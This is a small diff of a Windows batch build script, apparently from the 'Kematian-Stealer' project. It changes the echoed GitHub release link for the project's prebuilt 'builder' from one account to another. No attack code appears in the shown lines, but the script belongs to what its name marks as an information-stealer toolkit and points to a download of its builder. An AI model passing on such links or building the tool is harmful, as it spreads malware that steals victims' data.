@@ -5,7 +5,7 @@ cd /d %~dp0
 echo THIS IS IF YOU WANT TO BUILD THE BUILDER YOURSELF.
 echo THE BUILDER IS ALREADY BUILT BY GITHUB AND IS 100% OPEN SOURCE.
 echo THE BUILT BUILDER IS IN THE RELEASES ON THE GITHUB.
-echo https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder
+echo https://github.com/itzGlitxh/Kematian-Stealer/releases/tag/Builder
 echo.
 echo.
 echo Press any key to continue building the builder yourself.
